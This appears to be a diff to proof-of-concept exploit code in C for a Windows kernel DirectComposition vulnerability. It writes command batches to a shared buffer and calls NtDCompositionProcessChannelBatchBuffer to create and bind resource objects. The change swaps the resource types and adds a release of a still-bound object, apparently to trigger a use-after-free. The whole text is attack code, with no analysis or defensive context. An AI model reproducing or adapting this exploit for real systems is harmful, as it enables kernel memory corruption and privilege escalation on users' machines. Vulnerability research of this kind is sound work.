@@ -36,9 +36,9 @@ DWORD dwArg1, dwArg2;
 DWORD szBuff[0x400];
 
 #define TrackerBinding1 1
-#define TrackerBinding2 2
+#define CInteractionMarshaler1 2
 #define Tracker1 3
-#define Tracker2 4
+#define CManipulationMarshaler1 4
 #define Tracker3 5
 #define TrackerBinding3 6
 
@@ -80,7 +80,7 @@ int main(int argc, TCHAR* argv[])
 
     printf("[+] Create Second TrackerBinding Resource Object\n");
     *(DWORD*)(pMappedAddress) = nCmdCreateResource;
-    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding2;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionMarshaler1;
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x59;
     *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
@@ -102,7 +102,7 @@ int main(int argc, TCHAR* argv[])
 
     printf("[+] Create Tracker Resource 2 Object\n");
     *(DWORD*)(pMappedAddress) = nCmdCreateResource;
-    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker2;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x69;
     *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
@@ -123,8 +123,8 @@ int main(int argc, TCHAR* argv[])
     }
 
     printf("[+] Bind Tracker to the First TrackerBinding\n");
-    szBuff[0] = Tracker2;
-    szBuff[1] = TrackerBinding1;
+    szBuff[0] = CManipulationMarshaler1;
+    szBuff[1] = CInteractionMarshaler1;
 
     UINT datasize = 0x8; // Size == 0x10
     *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
@@ -137,4 +137,7 @@ int main(int argc, TCHAR* argv[])
         printf("[-] Bind Tracker to the First TrackerBinding \n");
         exit(-1);
     }
+    *(DWORD*)pMappedAddress = nCmdReleaseResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
+    NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 }
